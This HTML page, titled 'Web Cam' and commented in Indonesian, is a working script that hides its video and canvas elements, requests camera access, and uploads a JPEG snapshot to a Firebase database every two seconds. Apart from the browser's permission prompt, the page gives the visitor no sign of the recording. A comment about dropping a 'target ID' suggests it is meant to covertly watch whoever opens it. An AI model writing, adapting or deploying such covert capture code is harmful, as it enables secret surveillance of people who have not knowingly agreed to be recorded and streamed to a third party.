<!DOCTYPE html>
<html>
<head>
    <title>Web Cam</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
</head>
<body>
    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        // --- KONFIGURASI FIREBASE ---
        // GANTI BAGIAN INI DENGAN KONFIGURASI PROYEK KAMU SENDIRI
        const firebaseConfig = {
            apiKey: "AIzaSy...",
            authDomain: "project-id.firebaseapp.com",
            databaseURL: "https://project-id.firebaseio.com",
            projectId: "project-id",
            storageBucket: "project-id.appspot.com",
            messagingSenderId: "1234567890",
            appId: "1:1234567890:web:123456"
        };
        firebase.initializeApp(firebaseConfig);
        const database = firebase.database();

        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const context = canvas.getContext('2d');

        // Meminta izin kamera
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => {
                video.srcObject = stream;
                video.play();
                // Kirim foto setiap 2 detik
                setInterval(ambilDanKirimFoto, 2000);
            })
            .catch(err => console.error("Kamera ditolak: ", err));

        // FUNGSI UTAMA PENGIRIM DATA
        function ambilDanKirimFoto() {
            if (video.videoWidth === 0 || video.videoHeight === 0) return;

            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            // Kualitas 0.8 agar stabil dan tidak terlalu berat
            const dataFoto = canvas.toDataURL('image/jpeg', 0.8); 
            
            // MENGIRIM KE LOKASI TETAP (TIDAK PAKAI ID TARGET LAGI)
            database.ref('live_feed/latest').set({
                photo: dataFoto,
                timestamp: firebase.database.ServerValue.TIMESTAMP
            });
        }
    </script>
</body>
</html>
